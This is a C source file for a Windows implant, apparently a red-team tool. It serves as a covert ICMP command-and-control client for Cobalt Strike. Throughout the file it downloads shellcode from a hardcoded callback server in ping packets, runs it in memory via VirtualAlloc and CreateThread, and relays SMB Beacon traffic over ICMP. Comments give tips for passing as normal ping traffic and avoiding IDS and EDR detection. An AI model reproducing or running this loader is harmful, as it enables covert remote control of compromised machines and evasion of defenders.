//32 bit version of the client. Should be the saem as the 64 bit but have a seperate version just in case.

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>



///////////////////////////////////////////////////////////////////////
//// Client Settings
/*
Sleep in MS. How often to send an ICMP message back/checkin to the controller

NOTE - if you set this to something longer than a second, and have a small payload size, it will take a while
to download the initial payload

*/
#define SLEEP_TIME 1000 

/*
adjust this to set the max payload size per icmp request.

If trying to blend in, use 32 on windows systems. (which is the default payload size of windows `ping` command).
52 is standard for linux systems, you may be able to get away with that too.

Anything larger may start flagging IDS/IPS for ping of death, or malformed ICMP, etc etc. Expirement around and find out.

Note, smaller payload sizes will send a lot more chunks/ICMP requests in general, so you should find the balance
between payload size, the amount of ICMP requests sent, and the sleep time.

My best guess/reccomenedation would be 32 or 52 bytes for the payload (standard), and a sleep time of 1000 (1 second), which 
would look like fairly normal traffic patterns from windows if you did "ping google.com"

Max is 1472, which is the the MTU of 1500 - 20 for IPV4, and 8 for ICMP header

*/
#define ICMP_PAYLOAD_SIZE 1000  // in bytes, 


//Callback server that the Controller is listenening on
#define ICMP_CALLBACK_SERVER "172.19.241.197"
//4 Byte tag that is icnluded in each payload. Change to whatever you want, as long as it's 4 bytes
#define ICMP_TAG "RQ47"

/*
Named Pipe to connect your beacon to

This should match the "pipename" option provided to the TeamServer by the controller

ex: 
    pipename="mypipe" -> `#define PIPENAME "\\\\.\\pipe\\mypipe"`

*/
#define PIPENAME "\\\\.\\pipe\\foobar"

///////////////////////////////////////////////////////////////////////


//!!Do not touch any of these. They are needed for proper execution.
#define ICMP_ECHO       8 //The server is currently setup to only look for 8 & 0 ICMP requests. This may change in the future, in which these would be user editable
#define ICMP_ECHOREPLY  0
#define IPV4_HEADER    20 //sze of ipv4 header
#define ICMP_HEADER    8  //size of icmp header
#define TAG_SIZE       4  //tag size
#define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
//Cobalt Strike Settings
#define PAYLOAD_MAX_SIZE (512 * 1024)
#define BUFFER_MAX_SIZE (1024 * 1024)
///////////////////////////////////////////////////////////////////////
//Ohkay actual code stuff now:

// Prototypes
int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
char* recv_icmp_fragments(SOCKET s, uint32_t *out_len);
char* recv_icmp(SOCKET s, uint32_t *out_len);
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
void write_frame(HANDLE my_handle, char * buffer, DWORD length);
int bridge_to_beacon();

struct icmp_header {
    BYTE  Type;
    BYTE  Code;
    USHORT Checksum;
    USHORT ID;
    USHORT Sequence;
};

// Compute Internet checksum over `size` bytes (in network‐order) at `buffer`
USHORT checksum(USHORT* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) {
        cksum += *(UCHAR*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

char* reassembly_buffer = NULL;
int expected_size = 0;
int received_chunks = 0;
int total_chunks = 0;
int received_map[1000]; // track received fragments (max 1000)

// Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;

	/* read the 4-byte length */
	ReadFile(my_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}

// Writes a “frame” to the given HANDLE by first writing a 4‐byte length, then the data.
void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}

//
// send_icmp: send a single ICMP Echo Request (Type=8) with a custom sequence.
// Arguments:
//   s            = a raw socket (AF_INET, SOCK_RAW, IPPROTO_ICMP)
//   dest         = pointer to destination sockaddr_in
//   payload      = pointer to a buffer that already begins with TAG (4 bytes) followed by data
//   payload_len  = total length of `payload` (must be ≤ ICMP_PAYLOAD_SIZE)
//   seq_num      = sequence number to include (0 for “size” packet, 1..N for data chunks)
//
int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num) {
    char packet[MAX_PACKET_SIZE] = { 0 };
    struct icmp_header* icmp = (struct icmp_header*)packet;

    icmp->Type = ICMP_ECHO;                           // 8 = Echo Request
    icmp->Code = 0;
    icmp->ID = htons((USHORT)GetCurrentProcessId());
    icmp->Sequence = htons(seq_num);

    // Copy `payload_len` bytes of (TAG + data) right after the 8-byte ICMP header
    memcpy(packet + sizeof(struct icmp_header), payload, payload_len);

    icmp->Checksum = 0;
    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));

    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
    if (result == SOCKET_ERROR) {
        printf("[-] sendto failed: %d\n", WSAGetLastError());
        return -1;
    }
    printf("[+] Sent ICMP Echo Request: seq=%d, payload_len=%d\n", seq_num, payload_len);
    return 0;
}

//
// recv_icmp_fragments: block until all chunks (including seq 0) arrive as Echo Replies.
// Only processes packets satisfying:
//   - ICMP.Type    == ICMP_ECHOREPLY (0)
//   - ICMP.Code    == 0
//   - ICMP.ID      == GetCurrentProcessId()
//   - payload starts with “RQ47”
// Reassembles chunks of data (each chunk carries up to ICMP_PAYLOAD_SIZE−TAG_SIZE bytes).
//
/*
if seq == 0: Payload inbound (has size of inbound payload)
if seq > 0: normal messages 

*/
char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
    char recvbuf[MAX_PACKET_SIZE];
    struct sockaddr_in from;
    int fromlen = sizeof(from);

    printf("[*] Waiting to receive seq 0 and subsequent chunks...\n");

    while (TRUE) {
        int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
        if (bytes == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT) {
                printf("[-] recvfrom timed out\n");
            }
            else {
                printf("[-] recvfrom failed: %d\n", err);
            }
            return NULL;
        }


        ///////////////////////////////////////////////////////////////////////
        //// Filters
        ///////////////////////////////////////////////////////////////////////
        // Must be at least: IP header (20) + ICMP header (8) + TAG (4)
        if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
            continue;
        }

        struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
        char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);

        // Discard anything that is not an Echo Reply 
        if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
            continue;
        }

        // Discard replies not matching our process ID
        USHORT resp_id = ntohs(icmp->ID);
        if (resp_id != (USHORT)GetCurrentProcessId()) {
            continue;
        }

        // Discard if payload does not begin with TAG 
        if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
            continue;
        }

        ///////////////////////////////////////////////////////////////////////
        //// Sequence Handling
        ///////////////////////////////////////////////////////////////////////

        USHORT seq = ntohs(icmp->Sequence);
        printf("[+] Received Echo Reply: seq=%d, total_bytes=%d\n", seq, bytes);

        // Handle seq 0 — the size packet which tells how big the inbound message will be
        if (seq == 0) {
            // Next 4 bytes after TAG is total payload size (big-endian)
            uint32_t netlen = 0;
            memcpy(&netlen, payload + TAG_SIZE, sizeof(netlen));
            expected_size = ntohl(netlen);
            printf("[+] Seq 0: expected_size = %d bytes\n", expected_size);

            // Allocate buffer for the entire incoming payload
            if (reassembly_buffer) {
                free(reassembly_buffer);
                reassembly_buffer = NULL;
            }
            //check for max payload size - this makes sure that the clietn doesn't send some massive
            //buffer and crash the client. Currently set to half a mb.
            if (expected_size == 0 || expected_size > PAYLOAD_MAX_SIZE) {
                printf("[-] Invalid payload size %u (exceeds %u)\n",
                    expected_size, PAYLOAD_MAX_SIZE);
                return NULL;
            }
            //allocate memory for the buffer
            reassembly_buffer = (char*)malloc(expected_size);
            if (!reassembly_buffer) {
                perror("malloc");
                return NULL;
            }

            // Initialize map/counters
            memset(received_map, 0, sizeof(received_map));
            received_chunks = 0;
            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE; // 500 − 4 = 496
            total_chunks = (expected_size + data_per_chunk - 1) / data_per_chunk;
            printf("[+] Total chunks to receive: %d (data_per_chunk=%d)\n",
                total_chunks, data_per_chunk);
            continue;
        }

        // Handle seq > 0 — actual data fragments
        if (seq > 0 && seq <= total_chunks) {
            int chunk_index = seq - 1;
            if (received_map[chunk_index]) {
                printf("[*] Duplicate fragment seq=%d, skipping\n", seq);
                continue;
            }

            // Compute how many data bytes arrived (after IP+ICMP+TAG)
            int overhead = IPV4_HEADER + sizeof(struct icmp_header) + TAG_SIZE;
            int data_bytes = bytes - overhead;
            if (data_bytes < 0) data_bytes = 0;

            // Print chunk contents for debugging
            printf("[+] Chunk %d: data_bytes=%d\n", seq, data_bytes);
            //printf("    As text: \"%.*s\"\n", data_bytes, payload + TAG_SIZE);
            //printf("    Hex dump: ");
            //for (int i = 0; i < data_bytes; i++) {
            //    printf("%02x ", (unsigned char)(payload[TAG_SIZE + i]));
            //}
            //printf("\n");

            // Copy into reassembly_buffer at correct offset
            int data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
            int chunk_offset = chunk_index * data_per_chunk;
            int copy_bytes = data_bytes;
            if (chunk_offset + copy_bytes > expected_size) {
                copy_bytes = expected_size - chunk_offset;
            }
            memcpy(reassembly_buffer + chunk_offset, payload + TAG_SIZE, copy_bytes);

            received_map[chunk_index] = 1;
            received_chunks++;
            printf("[+] Stored chunk %d/%d\n", received_chunks, total_chunks);

            // Print entire chunk data
          //   printf("[+] Chunk %d: data_bytes=%d\n", seq, data_bytes);
          //   printf("    Hex dump of chunk %d: ", seq);
          //   for (int i = 0; i < data_bytes; i++) {
          //       printf("%02x ", (unsigned char)(payload[TAG_SIZE + i]));
          //   }
          //   printf("\n");

            if (received_chunks == total_chunks) {
                printf("[+] All fragments received!\n");
                //// Right after reassembly finishes:
                //printf("[+] Received full payload (%d bytes). Hex of first 16 bytes:\n    ", expected_size);
                //for (int i = 0; i < 16; i++) {
                //    printf("%02x ", (unsigned char)reassembly_buffer[i]);
                //}
                //printf("\n");
                //need to have expected length for buffer reasons
                *out_len = expected_size;
                return reassembly_buffer;
            }
        }
    }

    // Should not reach here
    return NULL;
}

// Modified recv_icmp to return both a data buffer and its length.
// Caller must pass a pointer to a uint32_t to receive the length.
char* recv_icmp(SOCKET s, uint32_t *out_len) {
    char recvbuf[MAX_PACKET_SIZE];
    struct sockaddr_in from;
    int fromlen = sizeof(from);

    printf("[*] Waiting for single ICMP Echo Reply...\n");
    int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
    if (bytes == SOCKET_ERROR) {
        printf("[-] recvfrom failed: %d\n", WSAGetLastError());
        return NULL;
    }

    // Must have at least IPv4 header + ICMP header + TAG
    if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
        return NULL;
    }

    struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
    char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);

    // ─── Check: It must be an Echo Reply for our PID ───
    if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
        return NULL;
    }
    if (ntohs(icmp->ID) != (USHORT)GetCurrentProcessId()) {
        return NULL;
    }
    // ─── Check: Payload must begin with TAG ───
    if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
        return NULL;
    }

    // Compute how many bytes follow the TAG
    int payload_len = bytes
                    - IPV4_HEADER
                    - sizeof(struct icmp_header)
                    - TAG_SIZE;
    if (payload_len <= 0) {
        return NULL;
    }

    // Allocate exactly payload_len bytes (+ no extra null terminator)
    char* out_data = (char*)malloc(payload_len);
    if (!out_data) {
        perror("malloc");
        return NULL;
    }
    memcpy(out_data, payload + TAG_SIZE, payload_len);

    // Set the out_len so caller knows the exact size
    *out_len = (uint32_t)payload_len;
    return out_data;
}

//
// bridge_to_beacon: high-level flow
//   1) Create raw ICMP socket
//   2) Build “seq 0” size packet: [TAG (4 bytes)] + [4-byte big-endian total-size]
//   3) send_icmp(..., seq=0)
//   4) call recv_icmp_fragments(), which returns the complete payload
//   5) Inject payload (as a new thread) and then relay any further traffic via named pipe
//
int bridge_to_beacon() {
    printf("[+] Creating raw socket...\n");
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == INVALID_SOCKET) {
        printf("[-] Error creating socket: %d\n", WSAGetLastError());
        return 1;
    }

    // Optional: set recv timeout so we don’t block forever
    //    int timeout_ms = 5000; // 5 seconds
    //    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);

    //get payload
    // 1) Build “seq=0” size packet
    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
    uint32_t netlen = htonl(expected_server_payload);

    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
    //// Copy “RQ47”
    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
    //// Then 4-byte big-endian length
    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
    //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
    int size_payload_len = TAG_SIZE + sizeof(netlen);

    //// Send seq=0 Echo Request
    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
        printf("[-] Failed to send seq=0 packet\n");
        closesocket(s);
        return 0;
    }

    //// 2) Wait for and reassemble all fragments (Echo Replies)
    uint32_t shellcode_len;
    char* shellcode = recv_icmp_fragments(s, &shellcode_len);
    if (!shellcode) {
        printf("[-] Failed to receive full payload\n");
        closesocket(s);
        return 0;
    }

    
    printf("[+] Received full payload: %u bytes\n", shellcode_len);
    printf("    First 256 bytes as string: %.256s\n", shellcode);
    //Grab payload over ICMP Bridge
    //char * shellcode = get_payload(s);
    // if (!shellcode) {
    //     fprintf(stderr, "[-] get_payload failed, exiting.\n");
    //     exit(EXIT_FAILURE);
    // }
    //unsigned int shellcode_len = (unsigned int)sizeof(shellcode);

    //could do some sneaky stuff here, make it sleep for X seconds before allocating memory to
    //potentially avoid an EDR mem scan

    ///////////////////////////////////////////////////////////////////////
    //// 1) Allocate R/W memory, copy your x64 shellcode, make it executable
    ///////////////////////////////////////////////////////////////////////

    printf("[+] Allocating memory\n");
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        PAYLOAD_MAX_SIZE, //allocate a buffer the size of the payload max size 
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!exec_mem) {
        printf("[-] VirtualAlloc failed: %u\n", GetLastError());
        return 1;
    }

    // Copy in the shellcode bytes
    RtlMoveMemory(exec_mem, shellcode, shellcode_len);

    // Change to R/X so CreateThread can jump into it
    printf("[+] Changing to R/X\n");
    DWORD old_prot;
    if (!VirtualProtect(exec_mem, PAYLOAD_MAX_SIZE, PAGE_EXECUTE_READ, &old_prot)) {
        printf("[-] VirtualProtect failed: %u\n", GetLastError());
        return 1;
    }

    ///////////////////////////////////////////////////////////////////////
    //// 2) Create a thread off of that exec_mem so the SMB Beacon actually runs
    ///////////////////////////////////////////////////////////////////////
    printf("[+] Creating Thread\n");

    HANDLE hShellcode = CreateThread(
        NULL,                        // default security
        0,                           // default stack
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,                        // no parameters
        0,                           // run immediately
        NULL                         // no thread ID needed
    );
    if (!hShellcode) {
        printf("[-] CreateThread(shellcode) failed: %u\n", GetLastError());
        return 1;
    }
    printf("[+] Spawned shellcode thread: handle = %p\n", hShellcode);

    /////////////////////////////////////////////////////////////////////
    // 3) Now wait for the SMB Beacon to land and create \\.\pipe\foobar
    /////////////////////////////////////////////////////////////////////
    printf("[+] Bridging to Named Pipe\n");
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        Sleep(1000); // sleep is here to make sure the pipe gets spun up, instead of infinitely looping over it .
        //remember, beacon is the one that opens the pipe, so if it doesn't run, we get no pipe :(
        printf("[+] Trying to connect to pipe...\n");
        handle_beacon = CreateFileA(
            PIPENAME,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, //connect to pipe anonymously
            NULL 
        );
        if (handle_beacon == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            printf("[*] CreateFileA still invalid (err=%u), retrying...\n", err);
        }
    }
    //printf("[+] Connected to pipe = %p\n", handle_beacon);

    printf("[+] Allocating Pipe buffer\n");
    char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
    if (!pipe_buffer) {
        DWORD err = GetLastError();
        printf("[*] MALLOC for pipe_buffer failed (err=%u)\n", err);
        closesocket(s);
        CloseHandle(handle_beacon);
        return 1;
    }

    /////////////////////////////////////////////////////////////////////
    // X) Beacon comms loop
    /////////////////////////////////////////////////////////////////////
    printf("[+] Starting beacon read loop\n");
    while (TRUE) {
        // 1) Read any data the Beacon has written into the named pipe.
        //    read_frame returns the number of bytes read, or 0 if no data.
        DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);

        // 2) Print exactly what came through the pipe.
        //    We use "%.*s" so that we print exactly 'beacon_output' bytes,
        //    even if the buffer contains binary data or no terminating '\0'.
        printf("[+] Read %u bytes from named pipe: \"", beacon_output);
        printf("%.*s", beacon_output, pipe_buffer);
        printf("\"\n");

        // 3) Package that pipe data into an ICMP payload for the controller.
        //    a) The first TAG_SIZE bytes must be our agreed‐upon tag (ICMP_TAG).
        //    b) After the tag, we copy up to (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes
        //       of actual beacon_output data.  Anything beyond that would overflow.
        int data_len = (int)beacon_output;
        if (data_len > ICMP_PAYLOAD_SIZE - TAG_SIZE) {
            data_len = ICMP_PAYLOAD_SIZE - TAG_SIZE;
        }
        char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
        memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
        memcpy(chunk_buf + TAG_SIZE, pipe_buffer, data_len);
        int chunk_payload_len = TAG_SIZE + data_len;

        // 4) Send a single ICMP Echo Request to the controller:
        //    - 's' is our raw socket.
        //    - '&dest' holds the controller’s IP address.
        //    - 'chunk_buf' is the full payload (TAG + data).
        //    - 'chunk_payload_len' is its actual length.
        //    - '1' is the ICMP sequence number for “data updates.”
        send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);

        // 5) Now ask the controller if it has queued any commands back to us.
        printf("[+] Getting data from controller\n");

        //moving to chunk based
        uint32_t controller_len = 0;

        // recv_icmp(s, &controller_len) will block (or timeout) until we get an ICMP Echo Reply.
        // It writes the exact payload length into 'controller_len', and returns a malloc’d buffer.
        // char* controller_resp = recv_icmp(s, &controller_len);
        // if (controller_resp) {
        //     // 5a) Print what the controller sent (controller_len bytes).
        //     printf("[+] Controller says (%u bytes): \"", controller_len);
        //     printf("%.*s", controller_len, controller_resp);
        //     printf("\"\n");

        //     // 5b) Forward the controller’s data back into the Beacon’s named pipe.
        //     //     We call write_frame(handle_beacon, controller_resp, controller_len),
        //     //     which writes exactly 'controller_len' bytes.  This is how the Beacon
        //     //     process reads and executes its next command.
        //     write_frame(handle_beacon, controller_resp, controller_len);

        //     // 5c) Free the buffer we got from recv_icmp.
        //     free(controller_resp);
        // }

        printf("[+] Getting data from controller (possibly multi‐packet)\n");

        //uint32_t controller_len = 0;
        char *controller_resp = recv_icmp_fragments(s, &controller_len);
        if (controller_resp) {
            write_frame(handle_beacon, controller_resp, controller_len);
            free(controller_resp);
        }

        // uint32_t controller_len = 0;
        // // recv_icmp_fragments will collect all fragments with seq=1 and give you the full buffer:
        // char *controller_resp = recv_icmp_fragments(s, &controller_len);
        // if (controller_resp) {
        //     // Print exactly controller_len bytes (may include zero bytes)
        //     printf("[+] Controller says (%u bytes): \"", controller_len);
        //     printf("%.*s", controller_len, controller_resp);
        //     printf("\"\n");

        //     // Forward the full controller_resp into the Beacon’s pipe
        //     write_frame(handle_beacon, controller_resp, controller_len);
        //     free(controller_resp);
        // }

        // 6) Sleep a short time before looping again.
        //    This prevents a tight spin if there’s no new pipe data or controller replies.
        Sleep(SLEEP_TIME);
    }
    // Cleanup
    free(pipe_buffer);
    CloseHandle(handle_beacon);
    closesocket(s);
    return 0;
}

void debug_constants() {
    printf("ICMP_ECHO: %d\n", ICMP_ECHO);
    printf("ICMP_ECHOREPLY: %d\n", ICMP_ECHOREPLY);
    printf("ICMP_PAYLOAD_SIZE: %d\n", ICMP_PAYLOAD_SIZE);
    printf("IPV4_HEADER: %d\n", IPV4_HEADER);
    printf("ICMP_HEADER: %d\n", ICMP_HEADER);
    printf("TAG_SIZE: %d\n", TAG_SIZE);
    printf("MAX_PACKET_SIZE: %d\n", MAX_PACKET_SIZE);
    printf("ICMP_CALLBACK_SERVER: %s\n", ICMP_CALLBACK_SERVER);
    printf("ICMP_TAG: %s\n", ICMP_TAG);
    printf("PIPENAME: %s", PIPENAME);
}

int main() {
    printf("[+] ICMP C2 Client Starting...\n");
    debug_constants();
	/* initialize winsock */
	WSADATA wsaData;
	WORD    wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);

    //run beacon logic
    int result = bridge_to_beacon();
    
    //cleanup afterwards
    WSACleanup();
    return 0;
}
